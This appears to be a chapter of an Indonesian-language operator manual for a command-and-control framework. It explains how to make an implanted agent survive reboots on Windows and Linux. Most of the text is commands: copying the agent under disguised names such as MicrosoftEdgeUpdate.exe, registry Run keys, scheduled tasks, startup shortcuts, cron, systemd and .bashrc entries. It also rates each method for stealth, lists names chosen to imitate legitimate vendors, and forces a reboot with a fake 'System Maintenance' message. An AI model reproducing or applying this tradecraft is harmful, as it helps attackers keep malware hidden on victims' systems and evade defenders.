# 07 — Persistence

## Konsep Persistence

Persistence adalah teknik untuk memastikan agent tetap berjalan setelah:
- Target reboot
- User logout dan login kembali
- Agent process crash dan restart

Tanpa persistence, agent hilang begitu target reboot. Dengan persistence, agent otomatis
restart dan reconnect ke C2.

> **Penting:** Persistence yang baik mengarah ke **binary yang stabil** — bukan ke
> file di `%TEMP%` yang bisa hilang kapan saja. Baca bagian
> [Persiapan Sebelum Persist](#persiapan-sebelum-persist) terlebih dahulu.

---

## Persiapan Sebelum Persist

### Masalah Path Ephemeral

Ketika stager menjalankan agent dengan exec-method `drop`, agent ditulis ke
`%TEMP%\<random>.exe`. Path ini tidak stabil karena:
- File bisa dihapus oleh Windows temp cleaner
- Path berubah di setiap deployment baru

### Solusi: Copy Agent ke Lokasi Permanen

Sebelum setup persistence, copy agent ke lokasi yang tidak berubah:

```
# Langkah 1: Cari path agent saat ini
cmd 2703886d "powershell -c \"(Get-Process -Id \$PID).MainModule.FileName\""
```

Output: `C:\Users\windows\AppData\Local\Temp\tmp12a3b4.exe`

```
# Langkah 2: Copy ke lokasi permanen dengan nama yang tidak mencurigakan
cmd 2703886d "copy C:\Users\windows\AppData\Local\Temp\tmp12a3b4.exe C:\Users\windows\AppData\Roaming\MicrosoftEdgeUpdate.exe"

# Verifikasi
cmd 2703886d "dir C:\Users\windows\AppData\Roaming\MicrosoftEdgeUpdate.exe"
```

Sekarang setup persistence ke path permanen itu.

### Alternatif: Biarkan Agent Persist Dirinya Sendiri

Kalau tidak tahu path agent, omit `--path` — agent otomatis gunakan `os.Executable()`:

```
persistence setup 2703886d --method registry_run --name "MicrosoftEdgeUpdate" --wait
```

Agent akan persist path-nya sendiri (apa pun path-nya saat ini).

---

## Setup Persistence

### Syntax

```
persistence setup <id> --method <METHOD> [--name <NAME>] [--path <PATH>] [--wait]
```

### Parameter

| Flag | Keterangan | Default |
|---|---|---|
| `--method` | Metode persistence (wajib) | — |
| `--name` | Nama entry (registry key name, task name, dll) | Auto-generate |
| `--path` | Path binary yang dipersist | Path agent sendiri |
| `--args` | Argumen tambahan untuk binary | kosong |
| `--wait` | Tunggu konfirmasi dari agent | false |

---

## Metode Windows

### `registry_run` — Registry Run Key

Tambah entry ke `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (atau HKLM
kalau punya admin rights). Binary jalan otomatis saat user login.

```
persistence setup 2703886d \
  --method registry_run \
  --name "MicrosoftEdgeUpdate" \
  --path "C:\Users\windows\AppData\Roaming\MicrosoftEdgeUpdate.exe" \
  --wait
```

**Karakteristik:**
- Berjalan saat **user login** (per user jika HKCU, semua user jika HKLM)
- Mudah diimplementasi, tidak butuh admin
- Terdeteksi oleh autoruns tools (Sysinternals Autoruns)
- Registry key ada di lokasi yang sering di-monitor

**Cek hasil:**

```
cmd 2703886d "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

---

### `schtasks_onlogon` — Scheduled Task (On Logon)

Buat scheduled task yang berjalan setiap kali user logon.

```
persistence setup 2703886d \
  --method schtasks_onlogon \
  --name "MicrosoftEdgeUpdateTask" \
  --path "C:\Users\windows\AppData\Roaming\MicrosoftEdgeUpdate.exe" \
  --wait
```

**Karakteristik:**
- Berjalan saat **user logon**
- Lebih sulit dideteksi daripada registry run
- Bisa dikonfigurasi dengan trigger yang lebih kompleks
- Butuh admin untuk SYSTEM-level tasks

**Cek hasil:**

```
cmd 2703886d "schtasks /query /tn MicrosoftEdgeUpdateTask /fo LIST"
```

---

### `schtasks_daily` — Scheduled Task (Daily)

Buat scheduled task yang berjalan setiap hari pada jam 09:00.

```
persistence setup 2703886d \
  --method schtasks_daily \
  --name "WindowsUpdateHelper" \
  --path "C:\Users\windows\AppData\Roaming\WinUpdHelper.exe" \
  --wait
```

**Karakteristik:**
- Berjalan pada **waktu tertentu setiap hari**
- Berguna kalau agent tidak butuh immediate restart
- Interval built-in: jam 09:00

---

### `startup_folder` — Startup Folder Shortcut

Buat shortcut (`.lnk`) di folder Startup Windows. File di sini dieksekusi otomatis
saat user login.

```
persistence setup 2703886d \
  --method startup_folder \
  --name "WindowsHelper" \
  --path "C:\Users\windows\AppData\Roaming\WindowsHelper.exe" \
  --wait
```

**Lokasi Startup Folder:**

```
# Per user
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

# Semua user (butuh admin)
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

**Karakteristik:**
- Sangat terlihat di Explorer (user bisa lihat isinya)
- Mudah diimplementasi
- Cocok jika user tidak technical

**Cek hasil:**

```
cmd 2703886d "dir \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\""
```

---

## Metode Linux

### `cron_reboot` — Cron Job

Tambah `@reboot` entry ke crontab user saat ini.

```
persistence setup <id> --method cron_reboot --name "syshelper" --path /home/user/.syshelper --wait
```

**Cek hasil:**

```
cmd <id> "crontab -l"
```

---

### `systemd_user` — Systemd User Service

Buat systemd user service yang auto-start saat user login.

```
persistence setup <id> --method systemd_user --name "sysmonitor" --path /home/user/.local/bin/sysmonitor --wait
```

**File service dibuat di:** `~/.config/systemd/user/sysmonitor.service`

---

### `bashrc` — Append to .bashrc

Tambah baris eksekusi di akhir `~/.bashrc`. Agent jalan setiap kali user buka
terminal bash baru.

```
persistence setup <id> --method bashrc --name "update" --path /tmp/.update --wait
```

**Keterbatasan:** Hanya jalan ketika user buka terminal baru, bukan saat reboot.

---

## Hapus Persistence

### Syntax

```
persistence remove <id> --method <METHOD> --name <NAME> [--wait]
```

### Contoh

```
# Hapus registry key
persistence remove 2703886d --method registry_run --name "MicrosoftEdgeUpdate" --wait

# Hapus scheduled task
persistence remove 2703886d --method schtasks_onlogon --name "MicrosoftEdgeUpdateTask" --wait

# Hapus startup folder shortcut
persistence remove 2703886d --method startup_folder --name "WindowsHelper" --wait
```

---

## Perbandingan Metode

| Metode | Trigger | Butuh Admin | Terdeteksi | Stealth |
|---|---|---|---|---|
| `registry_run` | User login | HKCU: tidak, HKLM: ya | Mudah | Rendah |
| `schtasks_onlogon` | User logon | Sebagian | Sedang | Sedang |
| `schtasks_daily` | Jadwal tetap | Sebagian | Sedang | Sedang |
| `startup_folder` | User login | Tidak | Mudah | Sangat rendah |
| `cron_reboot` | Reboot | Tidak | Sedang | Sedang |
| `systemd_user` | User login | Tidak | Sulit | Tinggi |
| `bashrc` | Buka terminal | Tidak | Sedang | Sedang |

---

## Nama yang Baik untuk Persistence

Nama entry persistence yang baik harus terlihat seperti software legitimate:

**Windows — nama yang baik:**
```
MicrosoftEdgeUpdate
WindowsDefenderUpdate
OneDriveStandaloneUpdater
GoogleChromeUpdateHelper
AdobeARMservice
IntelDriverUpdate
```

**Windows — nama yang buruk (jangan pakai):**
```
agent
c2backdoor
taburtuai
hacker
malware
```

---

## Verifikasi Persistence Berhasil

Cara terbaik memverifikasi persistence adalah dengan reboot target dan cek agent muncul kembali:

```
# Di console, catat agent ID dan status sebelum reboot
taburtuai › agents list

# Minta target reboot (atau tunggu)
cmd 2703886d "shutdown /r /t 5 /c \"System Maintenance\""

# Tunggu beberapa menit, cek agent kembali muncul
taburtuai › agents list
# Agent dengan ID yang sama harus muncul kembali dengan status online
```

---

**Selanjutnya:** [08 — Process Management](08-process.md)
